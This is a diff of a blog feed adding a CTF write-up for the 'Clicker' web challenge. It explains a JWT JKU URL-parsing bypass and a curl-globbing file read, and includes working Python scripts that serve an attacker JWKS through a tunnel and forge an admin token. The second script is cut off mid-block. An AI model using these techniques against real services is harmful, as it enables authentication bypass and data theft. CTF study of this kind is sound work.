@@ -1,9 +1,797 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-04-21T13:29:30+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">~/ilupii’s Cybersecurity Notes</title><subtitle>CTF Write-ups</subtitle><author><name>kentang@wsl2</name></author><entry><title type="html">C2C CTF Quals 2026</title><link href="http://localhost:4000/writeups/2026/c2c-ctf-quals-2026/" rel="alternate" type="text/html" title="C2C CTF Quals 2026" /><published>2026-04-21T13:10:11+08:00</published><updated>2026-04-21T13:10:11+08:00</updated><id>http://localhost:4000/writeups/2026/c2c-ctf-quals-2026</id><content type="html" xml:base="http://localhost:4000/writeups/2026/c2c-ctf-quals-2026/"><![CDATA[<ul id="markdown-toc">
-  <li><a href="#clicker" id="markdown-toc-clicker">Clicker</a></li>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-04-21T17:31:00+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">~/ilupii’s Cybersecurity Notes</title><subtitle>CTF Write-ups</subtitle><author><name>kentang@wsl2</name></author><entry><title type="html">C2C CTF Quals 2026</title><link href="http://localhost:4000/writeups/2026/c2c-ctf-quals-2026/" rel="alternate" type="text/html" title="C2C CTF Quals 2026" /><published>2026-04-21T13:10:11+08:00</published><updated>2026-04-21T13:10:11+08:00</updated><id>http://localhost:4000/writeups/2026/c2c-ctf-quals-2026</id><content type="html" xml:base="http://localhost:4000/writeups/2026/c2c-ctf-quals-2026/"><![CDATA[<ul id="markdown-toc">
+  <li><a href="#ai-usage" id="markdown-toc-ai-usage">AI Usage</a>    <ul>
+      <li><a href="#model-used" id="markdown-toc-model-used">Model used</a></li>
+      <li><a href="#promt-i-use" id="markdown-toc-promt-i-use">promt i use</a></li>
+      <li><a href="#the-purpose-of-using-ai" id="markdown-toc-the-purpose-of-using-ai">The purpose of using AI</a></li>
+    </ul>
+  </li>
+  <li><a href="#clicker" id="markdown-toc-clicker">Clicker</a>    <ul>
+      <li><a href="#description" id="markdown-toc-description">Description</a></li>
+      <li><a href="#initial-analysis" id="markdown-toc-initial-analysis">initial analysis</a></li>
+      <li><a href="#find-vuln" id="markdown-toc-find-vuln">find vuln</a></li>
+      <li><a href="#exploitation" id="markdown-toc-exploitation">Exploitation</a></li>
+    </ul>
+  </li>
+  <li><a href="#corp-mail" id="markdown-toc-corp-mail">Corp Mail</a>    <ul>
+      <li><a href="#initial-analisis" id="markdown-toc-initial-analisis">initial analisis</a></li>
+      <li><a href="#find-vuln-1" id="markdown-toc-find-vuln-1">Find vuln</a></li>
+      <li><a href="#exploit" id="markdown-toc-exploit">exploit</a></li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="ai-usage">AI Usage</h2>
+<p>Yeah, I use AI as my assistant</p>
+
+<h3 id="model-used">Model used</h3>
+<p>Gemini 3.0 pro</p>
+
+<h3 id="promt-i-use">promt i use</h3>
+<ul>
+  <li>“Help me analyze this code and find any vulnerabilities”</li>
+  <li>“Based on the strategy I came up with, can you create an exploit for it?”</li>
+</ul>
+
+<h3 id="the-purpose-of-using-ai">The purpose of using AI</h3>
+<ul>
+  <li>“simplify and speed up script creation”</li>
+  <li>“formulate a hypothesis”</li>
+  <li>“verify whether the strategy is successful and refine it”</li>
 </ul>
 
 <h1 id="web-exploitation">Web Exploitation</h1>
-<h2 id="clicker">Clicker</h2>]]></content><author><name>kali@wsl2</name></author><category term="combined" /><category term="web" /><category term="forensic" /><category term="pwn" /><category term="misc" /><summary type="html"><![CDATA[striving to be among the top 100]]></summary></entry><entry><title type="html">Understanding One-Byte Arbitrary Writes</title><link href="http://localhost:4000/writeups/2026/understanding-one-byte-arbitrary-writes/" rel="alternate" type="text/html" title="Understanding One-Byte Arbitrary Writes" /><published>2026-04-20T13:13:20+08:00</published><updated>2026-04-20T13:13:20+08:00</updated><id>http://localhost:4000/writeups/2026/understanding-one-byte-arbitrary-writes</id><content type="html" xml:base="http://localhost:4000/writeups/2026/understanding-one-byte-arbitrary-writes/"><![CDATA[<ul id="markdown-toc">
+<h2 id="clicker">Clicker</h2>
+<h3 id="description">Description</h3>
+<p>This challenge requires us to gain admin access by bypassing the JWT validation filter (specifically the JKU header), then using the curl-based file download feature in the admin panel to read /flag.txt. The main obstacles are the Python string filter that blocks the <code class="language-plaintext highlighter-rouge">file://</code> scheme and the curl binary limitations within the container.</p>
+<h3 id="initial-analysis">initial analysis</h3>
+<p>Here is an attachment containing all of these files</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre></td><td class="rouge-code"><pre>└─<span class="nv">$ </span>tree
+<span class="nb">.</span>
+├── app.py
+├── docker-compose.yml
+├── Dockerfile
+├── generate_keys.py
+├── requirements.txt
+├── routes
+│   ├── admin.py
+│   ├── auth.py
+│   └── game.py
+├── run.sh
+├── static
+│   ├── mambo.jpg
+│   └── mambo.mp3
+├── templates
+│   ├── admin.html
+│   ├── game.html
+│   └── index.html
+├── utils
+│   ├── auth.py
+│   ├── db.py
+│   ├── jwt_utils.py
+│   └── url_parser.py
+└── web_clicker.zip
+
+5 directories, 19 files
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="find-vuln">find vuln</h3>
+<p>vuln nya ada 2 tahap</p>
+<ul>
+  <li>Server-Side Request Forgery (SSRF) / URL Parsing Confusion pada validasi <code class="language-plaintext highlighter-rouge">JWT JKU (JSON Web Key Set URL)</code>.</li>
+  <li>Bypassing Python URL filter menggunakan fitur ekpansi Curl Globbing. <code class="language-plaintext highlighter-rouge">(LFI)</code></li>
+</ul>
+
+<h4 id="tahap-1--server-side-request-forgery-ssrf--url-parsing-confusion-pada-validasi-jwt-jku-json-web-key-set-url">tahap 1 : Server-Side Request Forgery (SSRF) / URL Parsing Confusion pada validasi <code class="language-plaintext highlighter-rouge">JWT JKU (JSON Web Key Set URL)</code>.</h4>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre><span class="c1"># utils/url_parser.py
+</span><span class="k">def</span> <span class="nf">extract_domain</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="n">url_without_scheme</span> <span class="o">=</span> <span class="n">remove_scheme</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="n">domain_and_port</span> <span class="o">=</span> <span class="n">url_without_scheme</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'/'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+
+    <span class="k">if</span> <span class="s">'@'</span> <span class="ow">in</span> <span class="n">domain_and_port</span><span class="p">:</span>
+        <span class="n">parts</span> <span class="o">=</span> <span class="n">domain_and_port</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'@'</span><span class="p">)</span>
+        <span class="n">domain_and_port</span> <span class="o">=</span> <span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+
+    <span class="k">return</span> <span class="n">domain_and_port</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>and</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="c1"># in utils/jwt_utils
+</span><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">jku_url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="o">---</span><span class="n">snipped</span> <span class="n">code</span><span class="o">---</span>
+<span class="n">decoded</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">public_key</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s">'RS256'</span><span class="p">])</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>di bagian file <code class="language-plaintext highlighter-rouge">utils/url_parser</code> itu terdapat validasi yang hanya mengecek apakah ada <code class="language-plaintext highlighter-rouge">localhost</code> dan Fungsi <code class="language-plaintext highlighter-rouge">split('@')</code> sangat berbahaya untuk memparsing URL. Attacker memanfaatkan fitur Basic Authentication HTTP (http://user:pass@host.com) untuk menempatkan kata <code class="language-plaintext highlighter-rouge">localhost</code> sebagai username/password palsu, sehingga lolos dari filter <code class="language-plaintext highlighter-rouge">if "localhost" in domain_parts</code>, lalu library requests mengeksekusi koneksi ke host asli di belakangnya.</p>
+
+<h4 id="tahap-2--bypassing-python-url-filter-menggunakan-fitur-ekpansi-curl-globbing">Tahap 2 : Bypassing Python URL filter menggunakan fitur ekpansi Curl Globbing.</h4>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+</pre></td><td class="rouge-code"><pre><span class="c1"># in file route/admin.py
+</span>
+<span class="o">@</span><span class="n">admin_bp</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/api/admin/download'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'POST'</span><span class="p">])</span>
+<span class="o">@</span><span class="n">token_required</span>
+<span class="o">@</span><span class="n">admin_required</span>
+<span class="k">def</span> <span class="nf">download_file</span><span class="p">():</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">get_json</span><span class="p">()</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'url'</span><span class="p">)</span>
+    <span class="n">filename</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'filename'</span><span class="p">)</span>
+    <span class="n">title</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'title'</span><span class="p">)</span>
+    <span class="n">file_type</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'type'</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">url</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">filename</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">title</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">'message'</span><span class="p">:</span> <span class="s">'URL, filename, and title required'</span><span class="p">}),</span> <span class="mi">400</span>
+
+    <span class="c1"># Make sure only http/s are allowed
+</span>    <span class="n">blocked_protocols</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="s">'dict'</span><span class="p">,</span> <span class="s">'file'</span><span class="p">,</span> <span class="s">'ftp'</span><span class="p">,</span> <span class="s">'ftps'</span><span class="p">,</span> <span class="s">'gopher'</span><span class="p">,</span> <span class="s">'gophers'</span><span class="p">,</span>
+        <span class="s">'imap'</span><span class="p">,</span> <span class="s">'imaps'</span><span class="p">,</span> <span class="s">'ipfs'</span><span class="p">,</span> <span class="s">'ipns'</span><span class="p">,</span> <span class="s">'ldap'</span><span class="p">,</span> <span class="s">'ldaps'</span><span class="p">,</span>
+        <span class="s">'mqtt'</span><span class="p">,</span> <span class="s">'pop3'</span><span class="p">,</span> <span class="s">'pop3s'</span><span class="p">,</span> <span class="s">'rtmp'</span><span class="p">,</span> <span class="s">'rtsp'</span><span class="p">,</span> <span class="s">'scp'</span><span class="p">,</span>
+        <span class="s">'sftp'</span><span class="p">,</span> <span class="s">'smb'</span><span class="p">,</span> <span class="s">'smbs'</span><span class="p">,</span> <span class="s">'smtp'</span><span class="p">,</span> <span class="s">'smtps'</span><span class="p">,</span> <span class="s">'telnet'</span><span class="p">,</span>
+        <span class="s">'tftp'</span><span class="p">,</span> <span class="s">'ws'</span><span class="p">,</span> <span class="s">'wss'</span><span class="p">,</span>
+    <span class="p">]</span>
+
+    <span class="n">url_lower</span> <span class="o">=</span> <span class="n">url</span><span class="p">.</span><span class="n">lower</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
+
+    <span class="k">for</span> <span class="n">proto</span> <span class="ow">in</span> <span class="n">blocked_protocols</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">url_lower</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="n">proto</span><span class="p">)</span> <span class="ow">or</span> <span class="p">(</span><span class="n">proto</span> <span class="o">+</span> <span class="s">':'</span><span class="p">)</span> <span class="ow">in</span> <span class="n">url_lower</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">'message'</span><span class="p">:</span> <span class="sa">f</span><span class="s">'Blocked protocol: </span><span class="si">{</span><span class="n">proto</span><span class="si">}</span><span class="s">'</span><span class="p">}),</span> <span class="mi">400</span>
+
+    <span class="n">filename</span> <span class="o">=</span> <span class="n">secure_filename</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">filename</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">'message'</span><span class="p">:</span> <span class="s">'Invalid filename'</span><span class="p">}),</span> <span class="mi">400</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">output_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="s">'static'</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">([</span><span class="s">'curl'</span><span class="p">,</span> <span class="s">'-o'</span><span class="p">,</span> <span class="n">output_path</span><span class="p">,</span> <span class="s">'--'</span><span class="p">,</span> <span class="n">url</span><span class="p">],</span>
+                              <span class="n">capture_output</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span> 
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Setelah masuk sebagai Admin, terdapat endpoint <code class="language-plaintext highlighter-rouge">/api/admin/download</code> yang menggunakan <code class="language-plaintext highlighter-rouge">curl</code> di belakang layar, tujuan kita untuk mendapatkan <code class="language-plaintext highlighter-rouge">flag.txt</code> yang terletak di <code class="language-plaintext highlighter-rouge">/static/</code> (Arbitrary File Write) agar bisa di akses
+tapii ritangannya yaitu</p>
+<ul>
+  <li>Server memblokir protokol dengan <code class="language-plaintext highlighter-rouge">url.startswith('file')</code></li>
+  <li>Binary curl di server tidak memiliki opsi -L (tidak bisa mem-bypass via SSRF HTTP Redirect), menolak protokol data://, dan parameter di-pass dengan aman (menolak Argument Injection -T).</li>
+</ul>
+
+<h3 id="exploitation">Exploitation</h3>
+<h4 id="tahap-1">Tahap 1</h4>
+<p>Penyerang membangkitkan pasangan kunci RSA (Private &amp; Public Key) secara lokal. Kunci publik dikemas dalam format JWKS (JSON Web Key Set) dan disajikan melalui server HTTP port 8000. Untuk menjembatani koneksi antara server target dan mesin lokal, digunakan layanan tunneling (Serveo) agar port 8000 tersebut dapat diakses secara publik.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">http.server</span>
+<span class="kn">import</span> <span class="nn">socketserver</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.asymmetric</span> <span class="kn">import</span> <span class="n">rsa</span>
+<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">serialization</span>
+
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">8000</span>
+<span class="n">HOST_IP</span> <span class="o">=</span> <span class="s">"172.17.0.1"</span>
+<span class="n">private_key</span> <span class="o">=</span> <span class="n">rsa</span><span class="p">.</span><span class="n">generate_private_key</span><span class="p">(</span><span class="n">public_exponent</span><span class="o">=</span><span class="mi">65537</span><span class="p">,</span> <span class="n">key_size</span><span class="o">=</span><span class="mi">2048</span><span class="p">)</span>
+<span class="n">public_key</span> <span class="o">=</span> <span class="n">private_key</span><span class="p">.</span><span class="n">public_key</span><span class="p">()</span>
+<span class="n">pn</span> <span class="o">=</span> <span class="n">public_key</span><span class="p">.</span><span class="n">public_numbers</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">int_to_base64</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">base64</span><span class="p">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">n</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">((</span><span class="n">n</span><span class="p">.</span><span class="n">bit_length</span><span class="p">()</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span><span class="p">,</span> <span class="s">'big'</span><span class="p">)).</span><span class="n">rstrip</span><span class="p">(</span><span class="sa">b</span><span class="s">'='</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
+
+<span class="c1"># Format JWKS untuk Server
+</span><span class="n">jwks</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">"keys"</span><span class="p">:</span> <span class="p">[{</span>
+        <span class="s">"kty"</span><span class="p">:</span> <span class="s">"RSA"</span><span class="p">,</span> <span class="s">"kid"</span><span class="p">:</span> <span class="s">"pwn"</span><span class="p">,</span> <span class="s">"use"</span><span class="p">:</span> <span class="s">"sig"</span><span class="p">,</span> <span class="s">"alg"</span><span class="p">:</span> <span class="s">"RS256"</span><span class="p">,</span>
+        <span class="s">"n"</span><span class="p">:</span> <span class="n">int_to_base64</span><span class="p">(</span><span class="n">pn</span><span class="p">.</span><span class="n">n</span><span class="p">),</span> <span class="s">"e"</span><span class="p">:</span> <span class="n">int_to_base64</span><span class="p">(</span><span class="n">pn</span><span class="p">.</span><span class="n">e</span><span class="p">)</span>
+    <span class="p">}]</span>
+<span class="p">}</span>
+
+<span class="n">pem</span> <span class="o">=</span> <span class="n">private_key</span><span class="p">.</span><span class="n">private_bytes</span><span class="p">(</span>
+    <span class="n">encoding</span><span class="o">=</span><span class="n">serialization</span><span class="p">.</span><span class="n">Encoding</span><span class="p">.</span><span class="n">PEM</span><span class="p">,</span>
+    <span class="nb">format</span><span class="o">=</span><span class="n">serialization</span><span class="p">.</span><span class="n">PrivateFormat</span><span class="p">.</span><span class="n">PKCS8</span><span class="p">,</span>
+    <span class="n">encryption_algorithm</span><span class="o">=</span><span class="n">serialization</span><span class="p">.</span><span class="n">NoEncryption</span><span class="p">()</span>
+<span class="p">)</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"privkey.pem"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">pem</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"[*] Private Key disimpan ke 'privkey.pem'"</span><span class="p">)</span>
+
+<span class="k">class</span> <span class="nc">JWKSHandler</span><span class="p">(</span><span class="n">http</span><span class="p">.</span><span class="n">server</span><span class="p">.</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">do_GET</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Request masuk dari: </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">client_address</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> ke path: </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">path</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+        <span class="bp">self</span><span class="p">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">send_header</span><span class="p">(</span><span class="s">'Content-type'</span><span class="p">,</span> <span class="s">'application/json'</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">end_headers</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">wfile</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">jwks</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[*] JWKS Server berjalan di Port </span><span class="si">{</span><span class="n">PORT</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+<span class="k">with</span> <span class="n">socketserver</span><span class="p">.</span><span class="n">TCPServer</span><span class="p">((</span><span class="s">""</span><span class="p">,</span> <span class="n">PORT</span><span class="p">),</span> <span class="n">JWKSHandler</span><span class="p">)</span> <span class="k">as</span> <span class="n">httpd</span><span class="p">:</span>
+    <span class="n">httpd</span><span class="p">.</span><span class="n">serve_forever</span><span class="p">()</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>setelah itu saya melakukan bypass autentikasi admin. Kerentanan terletak pada fungsi validate_jku yang membedah URL menggunakan karakter @. Dengan teknik URL Parsing Confusion, saya jg menyusun payloadnya <code class="language-plaintext highlighter-rouge">JKU</code> seperti ini <code class="language-plaintext highlighter-rouge">https://pwn@localhost@serveo_domain/jwks.json</code></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">jwt</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">serialization</span>
+
+<span class="c1"># --- KONFIGURASI ---
+</span><span class="n">BASE_URL</span> <span class="o">=</span> <span class="s">"http://localhost:5000"</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"[*] Loading Private Key from 'privkey.pem'..."</span><span class="p">)</span>
+<span class="k">try</span><span class="p">:</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"privkey.pem"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">private_key</span> <span class="o">=</span> <span class="n">serialization</span><span class="p">.</span><span class="n">load_pem_private_key</span><span class="p">(</span>
+            <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">(),</span> <span class="n">password</span><span class="o">=</span><span class="bp">None</span>
+        <span class="p">)</span>
+<span class="k">except</span> <span class="nb">FileNotFoundError</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"[-] Error: File 'privkey.pem' tidak ditemukan."</span><span class="p">)</span>
+    <span class="nb">exit</span><span class="p">()</span>
+
+<span class="c1"># 2. Input Domain Serveo
+</span><span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="s">"="</span><span class="o">*</span><span class="mi">50</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"[!] Contoh: ancor.serveo.net (TANPA https://)"</span><span class="p">)</span>
+<span class="n">serveo_domain</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"[?] Domain: "</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
+<span class="n">serveo_domain</span> <span class="o">=</span> <span class="n">serveo_domain</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"https://"</span><span class="p">,</span> <span class="s">""</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">"http://"</span><span class="p">,</span> <span class="s">""</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">"/"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">jku_bypass</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"https://pwn@localhost@</span><span class="si">{</span><span class="n">serveo_domain</span><span class="si">}</span><span class="s">/jwks.json"</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">"user_id"</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+    <span class="s">"username"</span><span class="p">:</span> <span class="s">"admin"</span><span class="p">,</span>
+    <span class="s">"is_admin"</span><span class="p">:</span> <span class="bp">True</span><span class="p">,</span>
+    <span class="s">"exp"</span><span class="p">:</span> <span class="mi">1999999999</span><span class="p">,</span>
+    <span class="s">"jku"</span><span class="p">:</span> <span class="n">jku_bypass</span>
+<span class="p">}</span>
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">"kid"</span><span class="p">:</span> <span class="s">"pwn"</span><span class="p">,</span> <span class="s">"jku"</span><span class="p">:</span> <span class="n">jku_bypass</span><span class="p">}</span>
+
+<span class="c1"># 4. Sign Token
+</span><span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">private_key</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s">'RS256'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">[*] Token JKU Payload: </span><span class="si">{</span><span class="n">jku_bypass</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+<span class="n">headers_req</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Authorization'</span><span class="p">:</span> <span class="sa">f</span><span class="s">'Bearer </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s">'</span><span class="p">}</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s">/api/admin/settings"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers_req</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+
+        <span class="c1"># Simpan token jika sukses
+</span>        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"admin_token.txt"</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Token disimpan ke 'admin_token.txt'."</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[-] Failed: </span><span class="si">{</span><span class="n">r</span><span class="p">.</span><span class="n">status_code</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
